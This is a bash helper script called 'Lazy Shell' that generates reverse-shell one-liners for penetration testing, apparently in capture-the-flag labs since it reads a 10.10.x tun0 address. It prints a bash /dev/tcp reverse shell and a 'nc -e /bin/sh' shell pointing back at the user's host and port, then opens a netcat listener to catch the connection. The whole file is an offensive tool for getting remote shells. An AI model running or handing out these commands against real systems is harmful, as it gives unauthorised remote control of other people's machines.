#!/bin/bash
host=$(/sbin/ifconfig tun0 | grep "10.10." | awk '{print $2}')

printf "
╔══════════════╗
   Lazy Shell
╚══════════════╝\n"
printf "Author: 0xAtti\n"


printf "\nOptions\n"
echo "( 1 ) Bash reverse shell with netcat"
echo "( 2 ) Standard shell text output\n"
printf "Select option: "
read input

if [ $input -ge "3" ]; then
printf "Please enter a valid option\n"
sh ~/.config/scripts/shell.sh
fi

if [ $input = 2 ]; then
printf 'Enter desired port: '
read -r port
printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
printf       "Bash Shell:  bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n"
printf     "\nNetCat Shell: nc -e /bin/sh $host $port\n"
printf "\n╚══════════════════════════════════════════════════════════════════╝\n"
exit
fi

if [ $input = 1 ]; then
printf "Enter desired port: "

fi
read -r port
if [ $port -lt "1000" ]; then
printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
printf   "  Bash Shell:  bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n\n"
printf "╚══════════════════════════════════════════════════════════════════╝\n\n"
sudo nc -lvp $port
fi

if [ $port -gt "1000" ]; then
printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
printf   "  Bash Shell:  bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n\n"
printf "╚══════════════════════════════════════════════════════════════════╝\n\n"
nc -lvp $port
fi
